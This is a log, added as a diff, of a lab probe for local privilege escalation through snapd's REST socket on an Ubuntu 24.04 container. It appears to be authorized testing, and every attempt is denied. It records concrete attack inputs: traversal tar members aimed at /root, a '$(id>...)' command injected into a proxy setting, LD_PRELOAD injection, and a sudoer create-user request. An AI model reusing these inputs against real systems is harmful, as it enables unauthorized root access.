@@ -1,0 +1,669 @@
+snapd REST deep local LPE probe
+target=ubuntu24-server-lpe-target
+2026-05-16T17:23:33-0400
+
+$ docker exec -i ubuntu24-server-lpe-target bash
+
+## pre-clean
+
+## target identity, packages, and snapd version
+PRETTY_NAME="Ubuntu 24.04.4 LTS"
+NAME="Ubuntu"
+VERSION_ID="24.04"
+VERSION="24.04.4 LTS (Noble Numbat)"
+VERSION_CODENAME=noble
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+SUPPORT_URL="https://help.ubuntu.com/"
+BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+Linux 508d797cbad0 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
+uid=0(root) gid=0(root) groups=0(root)
+uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
+apparmor	4.0.1really4.0.1-0ubuntu0.24.04.6	arm64
+curl	8.5.0-2ubuntu10.9	arm64
+dbus	1.14.10-4ubuntu4.1	arm64
+policykit-1		
+polkitd	124-2ubuntu1.24.04.3	arm64
+snapd	2.74.1+ubuntu24.04.4	arm64
+squashfs-tools	1:4.6.1-1build1	arm64
+systemd	255.4-1ubuntu8.15	arm64
+snap          2.74.1+ubuntu24.04.4
+snapd         2.74.1+ubuntu24.04.4
+series        16
+ubuntu        24.04
+kernel        6.10.14-linuxkit
+architecture  arm64
+
+## default snapd service and socket reachability
+running
+active
+active
+active
+enabled
+enabled
+enabled
+● snapd.service - Snap Daemon
+     Loaded: loaded (/usr/lib/systemd/system/snapd.service; enabled; preset: enabled)
+     Active: active (running) since Sat 2026-05-16 21:23:33 UTC; 135ms ago
+TriggeredBy: ● snapd.socket
+   Main PID: 259694 (snapd)
+      Tasks: 11 (limit: 9517)
+     Memory: 15.4M (peak: 18.7M)
+        CPU: 81ms
+     CGroup: /docker/508d797cbad09303136451b05788f2bf2f4994db28f983d783dfd7f7e10a399b/system.slice/snapd.service
+             └─259694 /usr/lib/snapd/snapd
+
+May 16 21:23:33 508d797cbad0 systemd[1]: Starting snapd.service - Snap Daemon...
+May 16 21:23:33 508d797cbad0 snapd[259694]: overlord.go:294: Acquiring state lock file
+May 16 21:23:33 508d797cbad0 snapd[259694]: overlord.go:299: Acquired state lock file
+May 16 21:23:33 508d797cbad0 snapd[259694]: daemon.go:276: started snapd/2.74.1+ubuntu24.04.4 (series 16; classic; devmode) ubuntu/24.04 (arm64) linux/6.10.14-linuxkit.
+May 16 21:23:33 508d797cbad0 snapd[259694]: daemon.go:370: adjusting startup timeout by 30s (pessimistic estimate of 30s plus 5s per snap)
+May 16 21:23:33 508d797cbad0 snapd[259694]: backends.go:70: AppArmor status: apparmor not enabled
+May 16 21:23:33 508d797cbad0 snapd[259694]: standby.go:95: will consider standby after: 5s
+May 16 21:23:33 508d797cbad0 systemd[1]: Started snapd.service - Snap Daemon.
+May 16 21:23:33 508d797cbad0 snapd[259694]: snapmgr.go:1659: performing periodic snap downloads cache cleanup
+May 16 21:23:33 508d797cbad0 snapd[259694]: snapmgr.go:1669: cannot clean store downloads cache: open /var/lib/snapd/cache: no such file or directory
+
+● snapd.socket - Socket activation for snappy daemon
+     Loaded: loaded (/usr/lib/systemd/system/snapd.socket; enabled; preset: enabled)
+     Active: active (running) since Sat 2026-05-16 20:04:41 UTC; 1h 18min ago
+   Triggers: ● snapd.service
+     Listen: /run/snapd.socket (Stream)
+             /run/snapd-snap.socket (Stream)
+      Tasks: 0 (limit: 9517)
+     Memory: 0B (peak: 0B)
+        CPU: 292us
+     CGroup: /docker/508d797cbad09303136451b05788f2bf2f4994db28f983d783dfd7f7e10a399b/system.slice/snapd.socket
+
+May 16 20:04:41 508d797cbad0 systemd[1]: Starting snapd.socket - Socket activation for snappy daemon...
+May 16 20:04:41 508d797cbad0 systemd[1]: Listening on snapd.socket - Socket activation for snappy daemon.
+
+● snapd.seeded.service - Wait until snapd is fully seeded
+     Loaded: loaded (/usr/lib/systemd/system/snapd.seeded.service; enabled; preset: enabled)
+     Active: active (exited) since Sat 2026-05-16 20:04:43 UTC; 1h 18min ago
+   Main PID: 268 (code=exited, status=0/SUCCESS)
+        CPU: 74ms
+
+May 16 20:04:41 508d797cbad0 systemd[1]: Starting snapd.seeded.service - Wait until snapd is fully seeded...
+May 16 20:04:43 508d797cbad0 systemd[1]: Finished snapd.seeded.service - Wait until snapd is fully seeded.
+
+[snapd.socket unit]
+# /usr/lib/systemd/system/snapd.socket
+[Unit]
+Description=Socket activation for snappy daemon
+
+[Socket]
+ListenStream=/run/snapd.socket
+ListenStream=/run/snapd-snap.socket
+SocketMode=0666
+# these are the defaults, but can't hurt to specify them anyway:
+SocketUser=root
+SocketGroup=root
+
+[Install]
+WantedBy=sockets.target
+
+[socket modes]
+srw-rw-rw- 666 root:root /run/snapd.socket
+srw-rw-rw- 666 root:root /run/snapd-snap.socket
+drwxr-xr-x 755 root:root /run/snapd
+drwxr-xr-x 755 root:root /var/lib/snapd
+drwxr-xr-x 755 root:root /snap
+
+[listening unix sockets]
+u_str LISTEN 0      4096                                 /run/snapd.socket 6741              * 0    users:(("snapd",pid=259694,fd=9),("systemd",pid=1,fd=137))                                    
+u_str LISTEN 0      4096                            /run/snapd-snap.socket 6742              * 0    users:(("snapd",pid=259694,fd=10),("systemd",pid=1,fd=138))                                   
+
+[polkit snapd actions]
+  <action id="io.snapcraft.snapd.manage">
+    <description gettext-domain="snappy">Install, update, or remove packages</description>
+    <message gettext-domain="snappy">Authentication is required to install, update, or remove packages</message>
+    <defaults>
+      <allow_any>auth_admin</allow_any>
+      <allow_inactive>auth_admin</allow_inactive>
+      <allow_active>auth_admin_keep</allow_active>
+    </defaults>
+  </action>
+
+  <action id="io.snapcraft.snapd.manage-interfaces">
+    <description gettext-domain="snappy">Connect, disconnect interfaces</description>
+    <message gettext-domain="snappy">Authentication is required to connect or disconnect interfaces</message>
+    <defaults>
+      <allow_any>auth_admin</allow_any>
+      <allow_inactive>auth_admin</allow_inactive>
+      <allow_active>auth_admin_keep</allow_active>
+    </defaults>
+  </action>
+
+  <action id="io.snapcraft.snapd.manage-configuration">
+    <description gettext-domain="snappy">Access or modify snap configuration</description>
+    <message gettext-domain="snappy">Authentication is required to access or modify snap configuration</message>
+    <defaults>
+      <allow_any>auth_admin</allow_any>
+      <allow_inactive>auth_admin</allow_inactive>
+      <allow_active>auth_admin_keep</allow_active>
+    </defaults>
+  </action>
+
+  <action id="io.snapcraft.snapd.manage-fde">
+    <description gettext-domain="snappy">Manage disk encryption</description>
+    <message gettext-domain="snappy">Authentication is required to manage disk encryption setup</message>
+    <defaults>
+      <allow_any>auth_admin</allow_any>
+      <allow_inactive>auth_admin</allow_inactive>
+      <allow_active>auth_admin_keep</allow_active>
+    </defaults>
+  </action>
+
+
+## default snap state and writable snapd paths
+No snaps are installed yet. Try 'snap install hello-world'.
+
+## attacker snap list
+$ runuser -u attacker -- snap list
+No snaps are installed yet. Try 'snap install hello-world'.
+rc=0
+drwxr-xr-x root:root /run/snapd -> 
+drwxr-xr-x root:root /run/snapd/lock -> 
+-rw------- root:root /run/snapd/lock/.lock -> 
+drwxr-xr-x root:root /run/snapd/ns -> 
+drwxr-xr-x root:root /var/lib/snapd -> 
+drwxr-xr-x root:root /var/lib/snapd/lib -> 
+drwxr-xr-x root:root /var/lib/snapd/lib/glvnd -> 
+drwxr-xr-x root:root /var/lib/snapd/lib/gl -> 
+drwxr-xr-x root:root /var/lib/snapd/lib/vulkan -> 
+drwxr-xr-x root:root /var/lib/snapd/lib/gl32 -> 
+drwxr-xr-x root:root /var/lib/snapd/dbus-1 -> 
+drwxr-xr-x root:root /var/lib/snapd/dbus-1/services -> 
+drwxr-xr-x root:root /var/lib/snapd/dbus-1/system-services -> 
+drwxr-xr-x root:root /var/lib/snapd/snaps -> 
+drwxr-xr-x root:root /var/lib/snapd/snaps/partial -> 
+drwxr-xr-x root:root /var/lib/snapd/desktop -> 
+drwxr-xr-x root:root /var/lib/snapd/desktop/applications -> 
+drwxr-xr-x root:root /var/lib/snapd/ssl -> 
+drwxr-xr-x root:root /var/lib/snapd/ssl/store-certs -> 
+d--x--x--x root:root /var/lib/snapd/void -> 
+drwxr-xr-x root:root /var/lib/snapd/auto-import -> 
+drwxr-xr-x root:root /var/lib/snapd/hostfs -> 
+drwxr-xr-x root:root /var/lib/snapd/inhibit -> 
+drwxr-xr-x root:root /var/lib/snapd/apparmor -> 
+drwxr-xr-x root:root /var/lib/snapd/apparmor/snap-confine -> 
+drwxr-xr-x root:root /var/lib/snapd/environment -> 
+drwxr-xr-x root:root /var/lib/snapd/firstboot -> 
+drwxr-xr-x root:root /var/lib/snapd/features -> 
+-rw-r--r-- root:root /var/lib/snapd/features/refresh-app-awareness -> 
+-rw-r--r-- root:root /var/lib/snapd/features/classic-preserves-xdg-runtime-dir -> 
+-rw-r--r-- root:root /var/lib/snapd/state.lock -> 
+-rw-r--r-- root:root /var/lib/snapd/system-key -> 
+drwx------ root:root /var/lib/snapd/cookie -> 
+drwxr-xr-x root:root /var/lib/snapd/assertions -> 
+drwxr-xr-x root:root /var/lib/snapd/assertions/private-keys-v1 -> 
+drwxr-xr-x root:root /var/lib/snapd/assertions/asserts-v0 -> 
+drwxr-xr-x root:root /var/lib/snapd/assertions/asserts-v0/model -> 
+-rw------- root:root /var/lib/snapd/state.json -> 
+drwxr-xr-x root:root /snap -> 
+-r--r--r-- root:root /snap/README -> 
+
+## attacker writable snapd state search
+$ runuser -u attacker -- bash -lc find\ /run/snapd\ /var/lib/snapd\ /snap\ -xdev\ -writable\ -printf\ \"%M\ %u:%g\ %p\\n\"\ 2\>/dev/null\ \|\ sed\ -n\ \"1\,120p\"
+rc=0
+
+## build attacker-controlled local snap with root marker hook
+
+## snap pack as attacker
+$ runuser -u attacker -- snap pack /tmp/snapd-rest-deep/snap-src /tmp
+built: /tmp/snapd-rest-deep-lpe_1.0_all.snap
+rc=0
+-rw-r--r-- 644 attacker:attacker 16384 /tmp/snapd-rest-deep-lpe_1.0_all.snap
+-rwxr-xr-x 755 attacker:attacker 342 /tmp/snapd-rest-deep/snap-src/meta/hooks/install
+
+## prepare assertion and snapshot/import path payloads
+
+## build snapshot import tar with absolute and traversal-like members
+$ runuser -u attacker -- bash -lc $'set -e; python3 - <<\'PY\'\nimport io\nimport tarfile\n\npayloads = {\n    "root/snapd_rest_deep_root_marker": b"relative-root-marker\\n",\n    "../../root/snapd_rest_deep_root_marker": b"traversal-root-marker\\n",\n    "/root/snapd_rest_deep_root_marker": b"absolute-root-marker\\n",\n    "tmp/snapd_rest_deep_tmp_marker": b"tmp-marker\\n",\n}\nwith tarfile.open("/tmp/snapd-rest-deep-import.tar", "w") as tf:\n    for name, data in payloads.items():\n        info = tarfile.TarInfo(name)\n        info.size = len(data)\n        info.mode = 0o644\n        info.uid = 1001\n        info.gid = 1001\n        info.uname = "attacker"\n        info.gname = "attacker"\n        tf.addfile(info, io.BytesIO(data))\nPY\nls -l /tmp/snapd-rest-deep-import.tar'
+-rw-r--r-- 1 attacker attacker 10240 May 16 21:23 /tmp/snapd-rest-deep-import.tar
+rc=0
+
+## attacker GET /v2 on snapd socket
+socket=/run/snapd.socket
+path=/v2
+HTTP/1.1 404 Not Found
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 88
+
+{"type":"error","status-code":404,"status":"Not Found","result":{"message":"not found"}}rc=0
+
+## attacker GET /v2/system-info on snapd socket
+socket=/run/snapd.socket
+path=/v2/system-info
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Transfer-Encoding: chunked
+
+{"type":"sync","status-code":200,"status":"OK","result":{"architecture":"arm64","build-id":"13476c98a1eccfcc83435dda3ccbd6db1b4f65be","confinement":"partial","features":{"apparmor-prompting":{"supported":false,"unsupported-reason":"cannot check apparmor kernel features: open /sys/kernel/security/apparmor/features: no such file or directory","enabled":false},"check-disk-space-install":{"supported":true,"enabled":false},"check-disk-space-refresh":{"supported":true,"enabled":false},"check-disk-space-remove":{"supported":true,"enabled":false},"classic-preserves-xdg-runtime-dir":{"supported":true,"enabled":true},"clustering":{"supported":true,"enabled":false},"confdb":{"supported":true,"enabled":false},"confdb-control":{"supported":true,"enabled":false},"content-compatibility-label":{"supported":true,"enabled":false},"dbus-activation":{"supported":true,"enabled":true},"gate-auto-refresh-hook":{"supported":true,"enabled":false},"hidden-snap-folder":{"supported":true,"enabled":false},"hotplug":{"supported":true,"enabled":false},"layouts":{"supported":true,"enabled":true},"move-snap-home-dir":{"supported":true,"enabled":false},"parallel-instances":{"supported":true,"enabled":false},"per-user-mount-namespace":{"supported":true,"enabled":false},"quota-groups":{"supported":true,"enabled":false},"refresh-app-awareness":{"supported":true,"enabled":true},"refresh-app-awareness-ux":{"supported":true,"enabled":false},"user-daemons":{"supported":true,"enabled":false}},"kernel-version":"6.10.14-linuxkit","locations":{"snap-bin-dir":"/snap/bin","snap-mount-dir":"/snap"},"managed":false,"on-classic":true,"os-release":{"id":"ubuntu","version-id":"24.04"},"refresh":{"timer":"00:00~24:00/4","hold":"2026-05-16T22:04:00Z"},"sandbox-features":{"configfiles":["mediated-configfiles"],"confinement-options":["classic","devmode"],"dbus":["mediated-bus-access"],"kmod":["mediated-modprobe"],"ldconfig":["mediated-ldconfig"],"mount":["layouts","mount-namespace","per-snap-persistency","per-snap-profiles","per-snap-updates","per-snap-user-profiles","stale-base-invalidation"],"seccomp":["bpf-actlog","bpf-argument-filtering","kernel:allow","kernel:errno","kernel:kill_process","kernel:kill_thread","kernel:log","kernel:trace","kernel:trap","kernel:user_notif"],"symlinks":["mediated-symlinks"],"udev":["device-cgroup-v2","device-filtering","tagging"]},"series":"16","snapd-bin-from":"native-package","system-mode":"run","version":"2.74.1+ubuntu24.04.4","virtualization":"docker"}}rc=0
+
+## attacker GET /v2/snaps on snapd socket
+socket=/run/snapd.socket
+path=/v2/snaps
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 79
+
+{"type":"sync","status-code":200,"status":"OK","result":[],"sources":["local"]}rc=0
+
+## attacker GET /v2/apps select service on snapd socket
+socket=/run/snapd.socket
+path=/v2/apps?select=service
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 59
+
+{"type":"sync","status-code":200,"status":"OK","result":[]}rc=0
+
+## attacker GET /v2/interfaces on snapd socket
+socket=/run/snapd.socket
+path=/v2/interfaces
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 59
+
+{"type":"sync","status-code":200,"status":"OK","result":{}}rc=0
+
+## attacker GET /v2/connections on snapd socket
+socket=/run/snapd.socket
+path=/v2/connections
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 97
+
+{"type":"sync","status-code":200,"status":"OK","result":{"established":[],"plugs":[],"slots":[]}}rc=0
+
+## attacker GET /v2/changes on snapd socket
+socket=/run/snapd.socket
+path=/v2/changes
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 59
+
+{"type":"sync","status-code":200,"status":"OK","result":[]}rc=0
+
+## attacker GET /v2/snapshots on snapd socket
+socket=/run/snapd.socket
+path=/v2/snapshots
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 59
+
+{"type":"sync","status-code":200,"status":"OK","result":[]}rc=0
+
+## attacker GET /v2/model on snapd socket
+socket=/run/snapd.socket
+path=/v2/model
+HTTP/1.1 200 OK
+Content-Type: application/x.ubuntu.assertion
+X-Ubuntu-Assertions-Count: 1
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 957
+
+type: model
+authority-id: generic
+series: 16
+brand-id: generic
+model: generic-classic
+classic: true
+timestamp: 2017-07-27T00:00:00.0Z
+sign-key-sha3-384: d-JcZF9nD9eBw7bwMnH61x-bklnQOhQud1Is6o_cn2wTj8EYDi9musrIT9z2MdAa
+
+AcLBXAQAAQoABgUCWYuXiAAKCRAdLQyY+/mCiST0D/0XGQauzV2bbTEy6DkrR1jlNbI6x8vfIdS8
+KvEWYvzOWNhNlVSfwNOkFjs3uMHgCO6/fCg03wGXTyV9D7ZgrMeUzWrYp6EmXk8/LQSaBnff86XO
+4/vYyfyvEYavhF0kQ6QGg8Cqr0EaMyw0x9/zWEO/Ll9fH/8nv9qcQq8N4AbebNvNxtGsCmJuXpSe
+2rxl3Dw8XarYBmqgcBQhXxRNpa6/AgaTNBpPOTqgNA8ZtmbZwYLuaFjpZP410aJSs+evSKepy/ce
++zTA7RB3384YQVeZDdTudX2fGtuCnBZBAJ+NYlk0t8VFXxyOhyMSXeylSpNSx4pCqmUZRyaf5SDS
+g1XxJet4IP0stZH1SfPOwc9oE81/bJlKsb9QIQKQRewvtUCLfe9a6Vy/CYd2elvcWOmeANVrJK0m
+nRaz6VBm09RJTuwUT6vNugXSOCeF7W3WN1RHJuex0zw+nP3eCehxFSr33YrVniaA7zGfjXvS8tKx
+AINNQB4g2fpfet4na6lPPMYM41WHIHPCMTz/fJQ6dZBSEg6UUZ/GiQhGEfWPBteK7yd9pQ8qB3fj
+ER4UvKnR7hcVI26e3NGNkXP5kp0SFCkV5NQs8rzXzokpB7p/V5Pnqp3Km6wu45cU6UiTZFhR2IMT
+l+6AMtrS4gDGHktOhwfmOMWqmhvR/INF+TjaWbsB6g==
+rc=0
+
+## attacker GET /v2/notices on snapd socket
+socket=/run/snapd.socket
+path=/v2/notices
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 335
+
+{"type":"sync","status-code":200,"status":"OK","result":[{"id":"1","user-id":null,"type":"change-update","key":"1","first-occurred":"2026-05-16T20:04:41.896894044Z","last-occurred":"2026-05-16T20:04:41.904093794Z","last-repeated":"2026-05-16T20:04:41.904093794Z","occurrences":3,"last-data":{"kind":"seed"},"expire-after":"168h0m0s"}]}rc=0
+
+## attacker POST /v2/snaps store install
+socket=/run/snapd.socket
+method=POST
+path=/v2/snaps
+body={"action":"install","snaps":["hello-world"],"channel":"stable"}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/snaps refresh
+socket=/run/snapd.socket
+method=POST
+path=/v2/snaps
+body={"action":"refresh","snaps":["core24"]}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/snaps remove
+socket=/run/snapd.socket
+method=POST
+path=/v2/snaps
+body={"action":"remove","snaps":["core24"],"purge":true}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/snaps JSON local snap path install
+socket=/run/snapd.socket
+method=POST
+path=/v2/snaps
+body={"action":"install","snap-path":"/tmp/snapd-rest-deep-lpe_1.0_all.snap","dangerous":true,"devmode":true}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## root marker after JSON local snap-path install attempt
+ROOT_PROOF=NO
+TMP_MARKER=NO
+
+## attacker POST /v2/snaps JSON try local directory
+socket=/run/snapd.socket
+method=POST
+path=/v2/snaps
+body={"action":"try","snap-path":"/tmp/snapd-rest-deep/snap-src","devmode":true}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## root marker after JSON try local directory attempt
+ROOT_PROOF=NO
+TMP_MARKER=NO
+
+## attacker POST /v2/snaps multipart dangerous local snap upload
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## root marker after multipart local snap upload attempt
+ROOT_PROOF=NO
+TMP_MARKER=NO
+
+## attacker CLI snap install dangerous local snap with path/env injection
+$ runuser -u attacker -- bash -lc set\ +e\;\ env\ SNAPD_DEBUG=1\ SNAP_MOUNT_DIR=/tmp/snapd-rest-deep/fake-mount\ SNAP_CONFINE_DEBUG=1\ LD_PRELOAD=/tmp/snapd-rest-deep-preload.so\ snap\ install\ --dangerous\ --devmode\ /tmp/snapd-rest-deep-lpe_1.0_all.snap\ \>\ /tmp/snapd-rest-deep-cli.out\ 2\>\&1\;\ rc=\$\?\;\ echo\ snap_install_rc=\$rc\;\ sed\ -n\ \"1\,80p\"\ /tmp/snapd-rest-deep-cli.out\;\ exit\ 0
+snap_install_rc=1
+ERROR: ld.so: object '/tmp/snapd-rest-deep-preload.so' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
+error.go:105: DEBUG: error: access denied
+error: access denied (try with sudo)
+rc=0
+
+## root marker after CLI install attempt
+ROOT_PROOF=NO
+TMP_MARKER=NO
+
+## attacker CLI snap try local directory
+$ runuser -u attacker -- bash -lc set\ +e\;\ SNAPD_DEBUG=1\ snap\ try\ --devmode\ /tmp/snapd-rest-deep/snap-src\;\ echo\ snap_try_rc=\$\?
+error.go:105: DEBUG: error: access denied
+error: access denied (try with sudo)
+snap_try_rc=1
+rc=0
+
+## root marker after CLI try attempt
+ROOT_PROOF=NO
+TMP_MARKER=NO
+
+## attacker POST /v2/interfaces connect
+socket=/run/snapd.socket
+method=POST
+path=/v2/interfaces
+body={"action":"connect","slots":[{"snap":"core","slot":"network"}],"plugs":[{"snap":"snapd-rest-deep-lpe","plug":"network"}]}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/create-user sudoer
+socket=/run/snapd.socket
+method=POST
+path=/v2/create-user
+body={"email":"root@example.invalid","sudoer":true,"known":true}
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 116
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/assertions invalid assertion body
+socket=/run/snapd.socket
+method=POST
+path=/v2/assertions
+input=/tmp/snapd-rest-deep.assert
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/snaps/system/conf config/env/path injection
+socket=/run/snapd.socket
+method=PUT
+path=/v2/snaps/system/conf
+body={"experimental.parallel-instances":true,"proxy.http":"http://127.0.0.1:9/$(id>/root/snapd_rest_deep_root_marker)","proxy.https":"file:///../../root/snapd_rest_deep_root_marker","refresh.timer":"00:00-24:00/4"}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## root marker after system config attempt
+ROOT_PROOF=NO
+TMP_MARKER=NO
+
+## attacker POST /v2/snapshots save-like action
+socket=/run/snapd.socket
+method=POST
+path=/v2/snapshots
+body={"action":"snapshot","snaps":["snapd-rest-deep-lpe"],"users":["attacker"]}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/snapshots restore action
+socket=/run/snapd.socket
+method=POST
+path=/v2/snapshots
+body={"action":"restore","set":1,"snaps":["snapd-rest-deep-lpe"],"users":["attacker"]}
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/snapshots import tar body
+socket=/run/snapd.socket
+method=POST
+path=/v2/snapshots
+input=/tmp/snapd-rest-deep-import.tar
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/snapshots multipart import tar
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## root marker after snapshot/import attempts
+ROOT_PROOF=NO
+TMP_MARKER=NO
+
+## attacker POST /v2/systems install-seed-like action
+socket=/run/snapd.socket
+method=POST
+path=/v2/systems
+body={"action":"install","label":"../../root/snapd_rest_deep_root_marker","mark-default":true}
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 116
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker POST /v2/system-recovery-keys
+socket=/run/snapd.socket
+method=POST
+path=/v2/system-recovery-keys
+body={"action":"reveal"}
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 116
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}rc=0
+
+## attacker GET /v2/system-info on snap socket
+socket=/run/snapd-snap.socket
+path=/v2/system-info
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 155
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"could not determine snap name for pid: not supported","kind":"login-required"}}rc=0
+
+## attacker GET /v2/system-info on snap socket with spoofed snap headers
+socket=/run/snapd-snap.socket
+path=/v2/system-info
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 155
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"could not determine snap name for pid: not supported","kind":"login-required"}}rc=0
+
+## attacker GET /v2/snaps on snap socket with spoofed snap headers
+socket=/run/snapd-snap.socket
+path=/v2/snaps
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 155
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"could not determine snap name for pid: not supported","kind":"login-required"}}rc=0
+
+## attacker POST snap-socket /v2/snapctl get system
+socket=/run/snapd-snap.socket
+method=POST
+path=/v2/snapctl
+body={"context-id":"bogus","args":["get","system"]}
+HTTP/1.1 400 Bad Request
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 168
+
+{"type":"error","status-code":400,"status":"Bad Request","result":{"message":"snapctl: cannot invoke snapctl operation commands (here \"get\") from outside of a snap"}}rc=0
+
+## attacker POST snap-socket /v2/snapctl set system marker
+socket=/run/snapd-snap.socket
+method=POST
+path=/v2/snapctl
+body={"context-id":"bogus","args":["set","system.snapd-rest-deep=/root/snapd_rest_deep_root_marker"]}
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 150
+
+{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"cannot use \"set\" with uid 1001, try with sudo","kind":"login-required"}}rc=0
+
+## attacker POST snap-socket /v2/snapctl services
+socket=/run/snapd-snap.socket
+method=POST
+path=/v2/snapctl
+body={"context-id":"bogus","args":["services","--global"]}
+HTTP/1.1 400 Bad Request
+Content-Type: application/json
+Date: Sat, 16 May 2026 21:23:34 GMT
+Content-Length: 173
+
+{"type":"error","status-code":400,"status":"Bad Request","result":{"message":"snapctl: cannot invoke snapctl operation commands (here \"services\") from outside of a snap"}}rc=0
+
+## root marker after snap-socket snapctl attempts
+ROOT_PROOF=NO
+TMP_MARKER=NO
+
+## final root marker verdict before cleanup
+FINAL_ROOT_PROOF=NO
+
+## cleanup
+ls: cannot access '/tmp/snapd-rest-deep': No such file or directory
+ls: cannot access '/tmp/snapd-rest-deep-lpe_1.0_all.snap': No such file or directory
+ls: cannot access '/root/snapd_rest_deep_root_marker': No such file or directory
+ls: cannot access '/tmp/snapd_rest_deep_tmp_marker': No such file or directory
+ls: cannot access '/tmp/snapd-rest-deep-import.tar': No such file or directory
+ls: cannot access '/tmp/snapd-rest-deep.assert': No such file or directory
+
+## final snapd health and installed snap state
+running
+active
+active
+active
